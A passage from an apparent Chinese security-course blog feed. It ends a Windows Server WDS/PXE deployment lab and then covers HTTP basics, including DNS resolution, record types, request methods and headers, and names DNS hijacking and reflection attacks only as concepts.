R2</td><td>AD/DNS/DHCP/WDS</td><td>PXE 服务端</td></tr><tr><td>Windows 10</td><td>裸机</td><td>PXE 客户端</td></tr><tr><td>Windows 7</td><td>无</td><td>DHCP 测试</td></tr></tbody></table><h3 id="21wds服务搭建"><a class="markdownIt-Anchor" href="#21wds服务搭建">#</a> 2.1：WDS 服务搭建</h3><p>步骤一：准备一台干净的 Windows Server 2012R2，设置好在<strong>计算机名</strong>并设置<strong>网卡为仅主机模式</strong>和<strong>静态的 IP 地址</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626227560204-4ff0293f-c0c3-4ec7-94aa-39b72b5f1842.png" alt="img"></p><p>步骤二：电脑重启之后打开服务器管理器点击<strong>添加角色和功能</strong>，一路回车来到选择服务器角色–》勾选【Active Directory 域服务，DHCP 服务器，DNS 服务器，Windows 部署服务】勾选后一路回车默认并到达安装页面进行安装…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626227928955-935fec6c-8d48-45cf-bbe3-f218522edf5e.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228019225-48814606-018a-43ae-9b94-b8cffffa8f3c.png" alt="img"></p><h3 id="22wds部署win10"><a class="markdownIt-Anchor" href="#22wds部署win10">#</a> 2.2：WDS 部署 Win10</h3><p>步骤一：将指定的服务搭建完成后，在小旗子下方选择【将此服务器提升为域控制器】并以此填写以下信息…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228231660-2d468936-6634-4864-948b-29a8eccbb53e.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228305838-ff7f77dd-d42e-45db-96a4-44d67cabb1f5.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228358966-a47f449b-bec1-4c04-a4ac-30ec13059a62.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228391136-4d73b02f-ddf3-492b-bef8-7f6c8cf69575.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228475118-ac5d54e9-b99b-48e8-81c5-41b95e79e4fd.png" alt="img"></p><p>步骤二：重启之后打开服务器管理器在其小旗子下面点击【完成 DHCP 配置】，并填写一下相关信息…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228760652-442746e2-0c2e-4c10-a23c-1914388631e3.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228772616-84b49e39-2071-462c-8865-ed8a0c2719da.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228784016-3d802ea3-157a-43e4-b6b5-aaa2f1406e99.png" alt="img"></p><p>步骤三：对 DHCP 服务器进行配置… 创建好作用域之后拿 Win7 客户机进行 DHCP 获取动态 IP 地址进行测试…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228917182-2f92be73-6abc-454d-b82e-4a6b4ca9450b.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228934709-6e52c384-465e-4565-93a6-a0d851959c92.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228951271-77402d9f-1440-49a5-afa7-bb7b4a4d328a.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626228997110-3004f64e-2df1-48d6-9d2e-21ecbef8969f.png" alt="img"></p><p>开启 Windows7 主机后可以看到在服务器的 DHCP 控制台里的地址租用选项已经获取到动态 IP 地址…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229226160-b425ad1b-5a37-4509-b3b5-a493ea3212bb.png" alt="img"></p><p>步骤四：将 Windows10 镜像文件通过光驱挂载到服务器上，并打开【WDS 部署服务管理控制台】对服务器进行配置…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229492925-f39efd60-5f11-4e8d-9fdc-9096151a26f9.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229451824-c23f5b43-5107-486c-8d81-7df28cc79cf8.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229555958-ff8659cf-ac07-4ff2-a58e-27c5757ccaf1.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229580080-28bc41aa-6ac2-41dc-af63-9ec3406fe0b1.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229594409-20b22c4c-9e86-4957-bbba-2b3531c77ec9.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229605981-2fbed673-f407-4609-aece-a5193d7030e5.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229617640-129a959f-4976-49d9-913c-9ba93be64c29.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229628071-a5966554-7a10-4ba5-9a1e-ffb986aca195.png" alt="img"></p><p>步骤五：添加安装镜像与启动镜像</p><ol><li>安装镜像，iso 的 sources 中的 install.wim 即可</li><li>启动映像，右击添加启动映像，打开选择框会自动定位在安装镜像的文件夹内，选择另一个 wim 镜像，即 boot.wim，这个就是启动映像。名字都是自定义的。</li></ol><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229708376-6dd52677-a867-4f8c-a475-8b5a2b3c9578.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229754199-9c7d79e6-228e-47ee-aeb7-c8d4865666f4.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229764618-50cbef46-e4b0-4d5c-800b-57719179883d.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626229776562-19fd28f9-37b8-42e5-a46a-dce5270d4e4c.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230002139-62b5c8e5-be2a-4240-8b19-aa44d0206172.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230012983-a1abe622-c747-41ac-b510-67741800a63c.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230032897-1a103944-f65c-4c81-897c-c8aa3b6f645f.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230045347-485edd25-15ce-45bc-b3f7-d2bded3f5798.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230061961-1ad94f4a-c15e-43e3-afc2-407edc55dd4c.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230073954-82b3e80c-2921-4313-9b0b-2ebec0c016e6.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230121262-6e0ac41e-db62-48af-95ce-139884670273.png" alt="img"></p><p>步骤六：新建个 windows 10 的虚拟机，并设置网络链接模式为仅主机模式… 开机安装操作系统…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230801249-8af3af47-08a6-4852-9ef2-6e309ad7f838.png" alt="img"></p><p>在此选择网络引导启动安装，可以的看到在 PXE 服务上获取的信息…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230842633-9872b6df-bbd5-4fcb-acad-63d1b3af0d96.png" alt="img"></p><p>正在加载引导文件…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230869472-1be67c39-0d7c-4513-b981-736c44bf9fe5.png" alt="img"></p><p>进入安装…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230901867-9de335d3-fa0f-4f31-88c3-99f8658640b4.png" alt="img"></p><p>将域管理员用户密码输入进行身份认证…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230928785-88265b97-9711-4cd9-821b-1b19ddc75d77.png" alt="img"></p><p>选择安装操作系统版本</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230939824-bc5954ce-6ab8-4321-bda6-a55a88671096.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230955748-e87ad540-4162-429b-81c0-0e6ad8bd8720.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230970182-2bb14cd9-9ebe-40d6-a5f2-f95037e82889.png" alt="img"></p><p>查看服务端的 DHCP 控制台获取 IP 地址状态…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626230996161-5041d9d8-949f-4fea-a86b-737026114e92.png" alt="img"></p><p>步骤七：安装完成进行测试…</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626231733607-81b38f56-1ea1-4679-96db-f47d9210b426.png" alt="img"></p><p>推介课程：法老:<br> 明教教主 乾隆堂   --》网络工程师</p><p>法老:<br> 安全牛  --》KALI 渗透测试</p><p>法老:<br> 菜鸟腾飞安全网 —》编程 渗透</p><p>法老:<br> 黑马程序员 —》Mysql</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;第三天：DHCP 与 WDS 服务&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;一dhcp服务&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一dhcp服务&quot;&gt;#&lt;/a&gt; 一：DHCP 服务&lt;/h1&gt;
&lt;p&gt;&lt;img data-sr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/1.3HTTP%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80/"/>
    <id>https://sun-spots.github.io/2022/01/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/1.3HTTP%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80/</id>
    <published>2022-01-19T01:45:54.822Z</published>
    <updated>2022-01-21T03:11:04.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第三天http通信基础"><a class="markdownIt-Anchor" href="#第三天http通信基础">#</a> 第三天：HTTP 通信基础</h1><h2 id="web介绍"><a class="markdownIt-Anchor" href="#web介绍">#</a> WEB 介绍</h2><h3 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介</h3><p>Web（World Wide Web）即全球广域网，也称为万维网（Internet），它是一种基于超文本和 HTTP 协议的、全球性的、动态交互的、跨平台的分布式图形信息系统。是建立在 Internet 上的一种网络服务，为浏览者在 Internet 上查找和浏览信息提供了图形化的、易于访问的直观界面，其中的文档及超级链接 Internet 上的信息节点组织成一个互为关联的网状结构。</p><p>简单来说，web 是 web 页面的载体，我们通过浏览器上网都是 Web。</p><h3 id="通信流程"><a class="markdownIt-Anchor" href="#通信流程">#</a> 通信流程</h3><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623380303682-a5dc317d-d0a1-4b8b-8ca1-34004e4e9564.png" alt="img"></p><p><strong>介绍：用户在客户端通过浏览器访问目标网站的域名，客户端通过 DNS 域名解析协议查找该域名所对应的 IP 地址并且返回给用户，后客户端通过 IP 地址进一步访问服务端。服务端对请求进行解析后，随后到资源库（数据库）查询资源，然后资源库将查找到的资源返回到服务端，后服务端将资源进一步返回到客户端，然后客户端将资源渲染到客户端的桌面上，用户便可以看到自己所想要的资源。</strong></p><p>1：<span class="exturl" data-url="aHR0cDovL3huLS13d3ctMHYxZW42NXouYmFpZHUuY29t">输入 www.baidu.com</span></p><p>2：解析成 IP 地址：192.168.0.1</p><p>3：浏览器通过该 IP 访问 web 服务器获取 web 资源</p><p>4：再返回给客户端</p><p>5：最后呈现在用户面前</p><h2 id="域名系统dns"><a class="markdownIt-Anchor" href="#域名系统dns">#</a> 域名系统 DNS</h2><h3 id="简介-2"><a class="markdownIt-Anchor" href="#简介-2">#</a> 简介</h3><p>DNS 是一个简单的<strong>请求 - 响应协议</strong>，是将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。<strong>DNS 使用 TCP 和 UDP 协议的 53 端口。</strong></p><h3 id="请求与响应"><a class="markdownIt-Anchor" href="#请求与响应">#</a> 请求与响应</h3><h4 id="dns记录"><a class="markdownIt-Anchor" href="#dns记录">#</a> DNS 记录</h4><ul><li><p><strong>A 记录（正向解析）</strong></p></li><li><ul><li>返回域名对应的 IPv4 地址</li></ul></li><li><p><strong>NS 记录</strong></p></li><li><ul><li>域名服务器</li><li>返回该域名由哪台域名服务器解析</li></ul></li><li><p><strong>PTR 记录（反向解析）</strong></p></li><li><ul><li>反向记录</li><li>从 IP 地址到域名的记录</li></ul></li><li><p><strong>MX 记录</strong></p></li><li><ul><li>电子邮件交换记录</li><li>记录邮件域名对应的 IP 地址</li></ul></li></ul><h4 id="响应码"><a class="markdownIt-Anchor" href="#响应码">#</a> 响应码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//NOERROR(无错误)</span><br><span class="line">No error condition</span><br><span class="line">无错误条件 </span><br><span class="line"></span><br><span class="line">//FORMERR(格式错误)</span><br><span class="line">Format error - The name server was unable to interpret the query</span><br><span class="line">    格式错误 - 名称服务器无法解释查询</span><br><span class="line"></span><br><span class="line">//SERVFAIL(服务失败)</span><br><span class="line">Server failure - The name server was unable to process this query due to a problem with the name server</span><br><span class="line">服务器故障 - 由于名称服务器出现问题，名称服务器无法处理此查询</span><br><span class="line"></span><br><span class="line">//NXDOMAIN</span><br><span class="line">this code signifies that the domain name referenced in the query does not exist</span><br><span class="line">此代码表示查询中引用的域名不存在</span><br><span class="line">    </span><br><span class="line">//NOTIMP(未实现)</span><br><span class="line">Not Implemented - The name server does not support the requested kind of query</span><br><span class="line">未实现 - 名称服务器不支持请求的查询类型</span><br><span class="line"></span><br><span class="line">//REFUSED(拒绝)</span><br><span class="line">Refused - The name server refuses to perform the specified operation for policy reasons</span><br><span class="line">拒绝 - 名称服务器出于策略原因拒绝执行指定的操作</span><br></pre></td></tr></table></figure><h3 id="域名系统工作原理"><a class="markdownIt-Anchor" href="#域名系统工作原理">#</a> 域名系统工作原理</h3><h4 id="解析过程"><a class="markdownIt-Anchor" href="#解析过程">#</a> 解析过程</h4><p>DNS 解析过程是递归查询的，具体过程如下：</p><p><span class="exturl" data-url="aHR0cDovL3d3dy5leGFtcGxlLmNvbQ==">www.example.com</span>：www 次级域   com 顶级域        顶级域名是<span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOUYlOUYlRTUlOTAlOEQ=">域名</span>的最后一个部分，即是域名最后一点之后的字母</p><ul><li><p>用户要访问域名 www.example.com 时，先查看本机 hosts 是否有记录或者本机是否有 DNS 缓存，如果有，直接返回结果，否则向递归服务器查询该域名的 IP 地址</p></li><li><p>递归缓存为空时，首先向根服务器查询 com 顶级域的 IP 地址</p></li><li><p>根服务器告知递归服务器 com 顶级域名服务器的 IP 地址</p></li><li><p>递归向 com 顶级域名服务器查询负责 example.com 的权威服务器的 IP</p></li><li><p>com 顶级域名服务器返回相应的 IP 地址</p></li><li><p>递归向 example.com 的权威服务器查询 www.example.com 的地址记录</p></li><li><p>权威服务器告知 www.example.com 的地址记录</p></li><li><p>递归服务器将查询结果返回客户端</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1625625284218-64866d9c-d553-4b02-b571-c0944637f847.png" alt="img"></p><h4 id="域传送"><a class="markdownIt-Anchor" href="#域传送">#</a> 域传送</h4><p>DNS 服务器可以分为主服务器、备份服务器和缓存服务器。域传送是指备份服务器从主服务器拷贝数据，并使用得到的数据更新自身数据库。<strong>域传送是在主备服务器之间同步数据库的机制。</strong></p><h3 id="服务器类型"><a class="markdownIt-Anchor" href="#服务器类型">#</a> 服务器类型</h3><h4 id="根服务器"><a class="markdownIt-Anchor" href="#根服务器">#</a> 根服务器</h4><ul><li><ul><li>根服务器是 DNS 的核心，负责互联网顶级域名的解析，用于维护域的权威信息，并将 DNS 查询引导到相应的域名服务器。</li><li>根服务器在域名树中代表最顶级的 “.” 域， 一般省略。</li></ul></li><li><ul><li>全球只有 13 台根服务器，13 台 IPv4 根服务器的域名标号为 a 到 m，<span class="exturl" data-url="aHR0cDovL3huLS1hLXB4OGEucm9vdC1zZXJ2ZXJzLnhuLS1vcmdtLXNtOWYucm9vdC1zZXJ2ZXJzLm9yZw==">即 a.root-servers.org 到 m.root-servers.org</span>，所有服务器存储的数据相同，仅包含 ICANN (互联网名称与数字地址分配机构) 批准的 TLD (顶级域) 域名权威信息。</li></ul></li></ul><h4 id="权威服务器"><a class="markdownIt-Anchor" href="#权威服务器">#</a> 权威服务器</h4><ul><li><ul><li>权威服务器上存储域名 Zone 文件，ZONE 文件是 DNS 上保存域名配置（域名与 ip 映射）的文件，维护域内域名的权威信息，递归服务器可以从权威服务器获得 DNS 查询的资源记录。</li><li>权威服务器需要在所承载的域名所属的 TLD 管理局注册，同一个权威服务器可以承载不同 TLD 域名，同一个域也可以有多个权威服务器。</li></ul></li></ul><h4 id="递归服务器"><a class="markdownIt-Anchor" href="#递归服务器">#</a> 递归服务器</h4><ul><li><ul><li>递归服务器负责接收用户的查询请求，进行递归查询并响应用户查询请求。在初始时递归服务器仅有记录了根域名的 Hint 文件。</li></ul></li></ul><h3 id="相关漏洞"><a class="markdownIt-Anchor" href="#相关漏洞">#</a> 相关漏洞</h3><h4 id="dns劫持"><a class="markdownIt-Anchor" href="#dns劫持">#</a> DNS 劫持</h4><p>DNS 劫持有多种方式，比较早期的攻击方式是通过攻击域名解析服务器，或是伪造 DNS 响应的方法，来将域名解析到恶意的 IP 地址。</p><p>随着互联网应用的不断发展，出现了基于废弃记录的劫持方式。这种方式发生的场景是次级域名的解析记录指向第三方资源，而第三方资源被释放后，解析记录并没有取消，在这种场景下，可以对应申请第三方资源，以获取控制解析记录的能力。</p><h4 id="拒绝服务"><a class="markdownIt-Anchor" href="#拒绝服务">#</a> 拒绝服务</h4><p>DNS 服务通常会开启 UDP 端口，当 DNS 服务器拥有大量二级域 NS 记录时，通过 DNS 的 UDP 反射攻击可以实现高倍的拒绝服务。</p><h2 id="http协议"><a class="markdownIt-Anchor" href="#http协议">#</a> HTTP 协议</h2><p>超文本传输协议（HTTP，HyperText Transfer Protocol) 是互联网上应用最为广泛的一种网络协议。所有的 WWW 文件都必须遵守这个标准。</p><h3 id="http请求类型介绍"><a class="markdownIt-Anchor" href="#http请求类型介绍">#</a> HTTP 请求类型介绍</h3><pre><code>HTTP 协议中共定义了八种方法或者叫“动作”来表明对 Request-URI 指定的资源的不同操作方式，以下为常用的6种：</code></pre><ul><li><ul><li>OPTIONS：返回服务器所支持的 HTTP 请求方法。</li><li>HEAD：与 GET 请求相一致的响应，但只返回头部信息，响应体将不会被返回。</li></ul></li><li><ul><li>GET：向特定的资源发出请求。</li><li>POST：向指定资源提交数据进行处理请求。数据被包含在请求体中。</li></ul></li><li><ul><li>PUT：向指定资源位置上传其最新内容。</li><li>DELETE：请求服务器删除指定资源。</li></ul></li></ul><h3 id="get和post区别"><a class="markdownIt-Anchor" href="#get和post区别">#</a> GET 和 POST 区别</h3><h4 id="1url可见性"><a class="markdownIt-Anchor" href="#1url可见性">#</a> 1：URL 可见性</h4><p>i：Get 传参方式是通过地址栏 URL 传递，是可以直接看到 get 传递的参数，get 把请求的数据在 URL 后通过？连接，通过 &amp; 进行参数分割。</p><p>ii：Post 传参方式参数 URL 不可见，post 将参数存放在 HTTP 的请求体中。</p><h4 id="2传输数据大小"><a class="markdownIt-Anchor" href="#2传输数据大小">#</a> 2：传输数据大小</h4><p>i：Get 传递数据是通过 URL 进行传递，对传递的数据长度是受到 URL 大小的限制，URL 最大长度是 2048 个字符。</p><p>ii：Post 所传递的参数没有长度限制。</p><h4 id="3后退页面"><a class="markdownIt-Anchor" href="#3后退页面">#</a> 3：后退页面</h4><p>Get 后退不会有影响，因为 get 传参直接连接在 URL 的后面，浏览器会有缓冲，后退直接显示即可</p><p>Post 后退会重新进行提交，因为 post 请求的所有参数放在请求体中，请求体发送到服务器，浏览器不会有缓冲，所以需要重新情求</p><h4 id="4缓存"><a class="markdownIt-Anchor" href="#4缓存">#</a> 4：缓存</h4><p>i：Get 请求可以被缓存，请求的记录会留在历史记录中。</p><p>ii：Post 不可以被缓存，请求不会留在历史记录。</p><h4 id="5编码方式"><a class="markdownIt-Anchor" href="#5编码方式">#</a> 5：编码方式</h4><p>i：Get  请求只 URL 编码。</p><p>ii：Post 支持多种编码方式。</p><h4 id="6字符类型"><a class="markdownIt-Anchor" href="#6字符类型">#</a> 6：字符类型</h4><p>i：Get  只支持 ASCII 字符。</p><p>ii：Post 没有字符类型限制。</p><h3 id="http请求响应过程"><a class="markdownIt-Anchor" href="#http请求响应过程">#</a> HTTP 请求响应过程</h3><h4 id="1域名解析"><a class="markdownIt-Anchor" href="#1域名解析">#</a> 1：域名解析</h4><p>首先浏览器会解析域名（准确的叫法应该是主机名）得到对应的 IP 地址，那怎么解析到对应的 IP 地址？</p><p>① 浏览器会首先搜索浏览器自身的 DNS 缓存（缓存时间比较短，大概只有 1 分钟，且只能容纳 1000 条缓存），看自身的缓存中是否有该域名对应的条目，而且没有过期，如果有且没有过期则解析到此结束；      （先搜索浏览器本身）</p><p>② 如果浏览器自身的缓存里面没有找到对应的条目，那么浏览器会搜索操作系统自身的 DNS 缓存，如果找到且没有过期则停止搜索解析到此结束；      （自己操作系统本身）</p><p>③ 如果在 Windows 系统的 DNS 缓存也没有找到，那么尝试读取 hosts 文件（位于 C:\Windows\System32\drivers\etc），看看这里面有没有该域名对应的 IP 地址，如果有则解析成功；      （查找 host 目录）</p><p>④ 如果在 hosts 文件中也没有找到对应的条目，浏览器就会发起一个 DNS 的系统调用，就会向本地配置的首选 DNS 服务器（一般是电信运营商提供的，也可以使用像 Google 提供的 DNS 服务器）发起域名解析请求（通过的是 UDP 协议向 DNS 的 53 端口发起请求，这个请求是递归的请求，也就是运营商的 DNS 服务器必须得提供给我们该域名的 IP 地址），运营商的 DNS 服务器首先查找自身的缓存，找到对应的条目，且没有过期，则解析成功。如果没有找到对应的条目，则有运营商的 DNS 代我们的浏览器发起迭代 DNS 解析请求，它首先是会找根域的 DNS 的 IP 地址（这个 DNS 服务器都内置 13 台根域的 DNS 的 IP 地址），然后进一步请求； 正常情况下通过这四步基本就能解析域名获得 IP 了。     （向 DNS 服务器进行请求）</p><h4 id="2发起tcp3次握手"><a class="markdownIt-Anchor" href="#2发起tcp3次握手">#</a> 2：发起 TCP3 次握手</h4><p>拿到域名对应的 IP 地址之后，User-Agent（一般是指浏览器）会以一个随机端口（1024 &lt; 端口 &lt; 65535）向服务器的 WEB 程序的 80 端口发起 TCP 的连接请求。这个连接请求（原始的 http 请求经过 TCP/IP4 层模型的层层封包）到达服务器端后（这中间通过各种路由设备，局域网内除外），进入到网卡，然后是进入到内核的 TCP/IP 协议栈（用于识别该连接请求，解封包，一层一层的剥开），还有可能要经过 Netfilter 防火墙（属于内核的模块）的过滤，最终到达 WEB 程</p><h4 id="3建立tcp连接后发起http请求"><a class="markdownIt-Anchor" href="#3建立tcp连接后发起http请求">#</a> 3：建立 TCP 连接后发起 HTTP 请求</h4><p>经过 TCP3 次握手之后，浏览器发起了 http 的请求</p><h4 id="4服务器端响应http请求浏览器得到html代码"><a class="markdownIt-Anchor" href="#4服务器端响应http请求浏览器得到html代码">#</a> 4：服务器端响应 http 请求，浏览器得到 html 代码</h4><p>服务器端 WEB 程序接收到 http 请求以后，就开始处理该请求，处理之后就返回给浏览器 html 文件</p><h4 id="5浏览器解析html代码并请求html代码中的资源"><a class="markdownIt-Anchor" href="#5浏览器解析html代码并请求html代码中的资源">#</a> 5：浏览器解析 html 代码，并请求 html 代码中的资源</h4><p>浏览器拿到 html 文件后，就开始解析其中的 html 代码，遇到 js/css/image 等静态资源时，就向服务器端去请求下载（会使用多线程下载，每个浏览器的线程数不一样），这个时候就用上 keep-alive 特性了，建立一次 HTTP 连接，可以请求多个资源，下载资源的顺序就是按照代码里的顺序，但是由于每个资源大小不一样，而浏览器又多线程请求请求资源，所以请求成功显示的顺序并不一定是代码里面的顺序。 浏览器在请求静态资源时（在未过期的情况下），向服务器端发起一个 http 请求（询问自从上一次修改时间到现在有没有对资源进行修改），如果服务器端返回 304 状态码（告诉浏览器服务器端没有修改），那么浏览器会直接读取本地的该资源的缓存文件。</p><h4 id="6浏览器对页面进行渲染呈现给用户"><a class="markdownIt-Anchor" href="#6浏览器对页面进行渲染呈现给用户">#</a> 6：浏览器对页面进行渲染呈现给用户</h4><p>浏览器利用自己内部的工作机制，把请求到的静态资源和 html 代码进行渲染，渲染之后呈现给用户。</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623380969565-a743a1be-0431-4721-bf2f-efa990ee75c3.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1624897224672-3fd38551-fca1-48da-8d9f-182ed759eea6.png" alt="img"></p><h3 id="http请求报文"><a class="markdownIt-Anchor" href="#http请求报文">#</a> HTTP 请求报文</h3><h4 id="1组成"><a class="markdownIt-Anchor" href="#1组成">#</a> 1：组成</h4><p>一个 HTTP 请求报文由四个部分组成：请求行、请求头部、空行、请求数据。</p><h4 id="2服务器端响应http请求浏览器得到html代码"><a class="markdownIt-Anchor" href="#2服务器端响应http请求浏览器得到html代码">#</a> 2：服务器端响应 http 请求，浏览器得到 html 代码</h4><ul><li><ul><li>请求行由请求方法字段、URL 字段和 HTTP 协议版本字段 3 个字段组成，它们用空格分隔。比如 GET /data/info.html HTTP/1.1</li><li>方法字段就是 HTTP 使用的请求方法，比如常见的 GET/POST</li></ul></li><li><ul><li>其中 HTTP 协议版本有两种：HTTP1.0/HTTP1.1 可以这样区别：</li></ul></li><li><ul><li><ul><li>HTTP1.0 对于每个连接都只能传送一个请求和响应，请求就会关闭，HTTP1.0 没有 Host 字段；</li><li>HTTP1.1 在同一个连接中可以传送多个请求和响应，多个请求可以重叠和同时进行，HTTP1.1 必须有 Host 字段。</li></ul></li></ul></li></ul><h4 id="3空行"><a class="markdownIt-Anchor" href="#3空行">#</a> 3：空行</h4><p>它的作用是通过一个空行，告诉服务器请求头部到此为止。</p><h4 id="4请求数据"><a class="markdownIt-Anchor" href="#4请求数据">#</a> 4：请求数据</h4><p>若方法字段是 GET，则此项为空，没有数据；</p><p>若方法字段是 POST, 则通常来说此处放置的就是要提交的数据；</p><p>比如要使用 POST 方法提交一个表单，其中有 user 字段中数据为 “admin”, password 字段为 123456，那么这里的请求数据就是 user=admin&amp;password=123456，使用 &amp; 来连接各个字段。</p><h4 id="5http请求报文格式"><a class="markdownIt-Anchor" href="#5http请求报文格式">#</a> 5：HTTP 请求报文格式</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623382353294-bf11e52b-c4ab-4794-9838-a1c317a02858.png" alt="img"></p><h4 id="6post请求"><a class="markdownIt-Anchor" href="#6post请求">#</a> 6：POST 请求</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1623382365899-56b9ea24-d4eb-4a27-bc87-4255d232a865.png" alt="img"></p><h4 id="7常见的请求头"><a class="markdownIt-Anchor" href="#7常见的请求头">#</a> 7：常见的请求头</h4><ul><li><p><strong>Accept</strong></p></li><li><ul><li>指定客户端能够接收的内容类型</li><li>Accept: text/plain, text/html</li></ul></li><li><p><strong>Accept-Charset</strong></p></li><li><ul><li>浏览器可以接受的字符编码集</li><li>Accept-Charset: iso-8859-5</li></ul></li><li><p><strong>Accept-Encoding</strong></p></li><li><ul><li>指定浏览器可以支持的 web 服务器返回内容压缩编码类型</li><li>Accept-Encoding: compress, gzip</li></ul></li><li><p><strong>Accept-Language</strong></p></li><li><ul><li>浏览器可接受的语言</li><li>Accept-Language: en,zh</li></ul></li><li><p><strong>Cache-Control</strong></p></li><li><ul><li>指定请求和响应遵循的缓存机制 Cache-Control: no-cache</li></ul></li><li><p><strong>Connection</strong></p></li><li><ul><li>表示是否需要持久连接 // HTTP 1.1 默认进行持久连接</li><li>Connection: close</li></ul></li><li><p><strong>Cookie</strong></p></li><li><ul><li>HTTP 请求发送时，会把保存在该请求域名下的所有 cookie 值一起发送给 web 服务器</li><li>Cookie: role=admin;ssid=1</li></ul></li><li><p><strong>Content-Length</strong></p></li><li><ul><li>请求的内容长度</li><li>Content-Length: 348</li></ul></li><li><p><strong>Content-Type</strong></p></li><li><ul><li>请求的与实体对应的 MIME 信息</li><li>Content-Type: application/x-www-form-urlencoded</li></ul></li><li><p><strong>Date</strong></p></li><li><ul><li>请求发送的日期和时间</li><li>Date: Tue, 15 